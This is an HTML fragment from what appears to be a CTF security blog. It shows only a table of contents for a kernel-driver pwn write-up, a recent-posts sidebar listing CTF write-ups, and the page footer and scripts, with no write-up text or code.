href="#%E5%A6%82%E4%BD%95%E8%A7%A3%E5%8E%8Bcpio%E6%96%87%E4%BB%B6"><span class="toc-number">16.0.1.</span> <span class="toc-text">如何解压cpio文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4-7"><span class="toc-number">16.1.</span> <span class="toc-text">保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#start-script"><span class="toc-number">16.1.1.</span> <span class="toc-text">start script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#driver"><span class="toc-number">16.1.2.</span> <span class="toc-text">driver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-script"><span class="toc-number">16.1.3.</span> <span class="toc-text">init script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"><span class="toc-number">16.2.</span> <span class="toc-text">程序逻辑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init-module%E5%87%BD%E6%95%B0"><span class="toc-number">16.2.1.</span> <span class="toc-text">init_module函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exit-core-%E5%87%BD%E6%95%B0"><span class="toc-number">16.2.2.</span> <span class="toc-text">exit_core 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-ioctl%E5%87%BD%E6%95%B0"><span class="toc-number">16.2.3.</span> <span class="toc-text">core_ioctl函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-read%E5%87%BD%E6%95%B0"><span class="toc-number">16.2.4.</span> <span class="toc-text">core_read函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#core-copy-func"><span class="toc-number">16.2.5.</span> <span class="toc-text">core_copy_func</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9-1"><span class="toc-number">16.3.</span> <span class="toc-text">漏洞点</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/01/08/wp-huawei-xctf-2020/" title="HUAWEI XCTF 2020 PWN WRITE UP"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HUAWEI XCTF 2020 PWN WRITE UP"/></a><div class="content"><a class="title" href="/2021/01/08/wp-huawei-xctf-2020/" title="HUAWEI XCTF 2020 PWN WRITE UP">HUAWEI XCTF 2020 PWN WRITE UP</a><time datetime="2021-01-08T06:43:24.000Z" title="Created 2021-01-08 14:43:24">2021-01-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/06/axb2020/" title="Some small records of the I-SOON Cup Of CUIT CTF Competition final"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Some small records of the I-SOON Cup Of CUIT CTF Competition final"/></a><div class="content"><a class="title" href="/2020/12/06/axb2020/" title="Some small records of the I-SOON Cup Of CUIT CTF Competition final">Some small records of the I-SOON Cup Of CUIT CTF Competition final</a><time datetime="2020-12-06T10:42:47.000Z" title="Created 2020-12-06 18:42:47">2020-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/24/wp-xyb-2020/" title="祥云杯 2020 WP"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="祥云杯 2020 WP"/></a><div class="content"><a class="title" href="/2020/11/24/wp-xyb-2020/" title="祥云杯 2020 WP">祥云杯 2020 WP</a><time datetime="2020-11-24T14:47:47.000Z" title="Created 2020-11-24 22:47:47">2020-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/15/issues/" title="issues"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="issues"/></a><div class="content"><a class="title" href="/2020/11/15/issues/" title="issues">issues</a><time datetime="2020-11-15T13:36:30.000Z" title="Created 2020-11-15 21:36:30">2020-11-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/13/cve-2018-18708/" title="CVE-2018-18708"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2018-18708"/></a><div class="content"><a class="title" href="/2020/11/13/cve-2018-18708/" title="CVE-2018-18708">CVE-2018-18708</a><time datetime="2020-11-12T16:33:51.000Z" title="Created 2020-11-13 00:33:51">2020-11-13</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/text_bg.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By i0gan</div><div class="framework-info"></div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.gov.cn/"><img class="icp-icon" src="/img/icp.png" alt="ICP"/><span>黔ICP备20006037号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>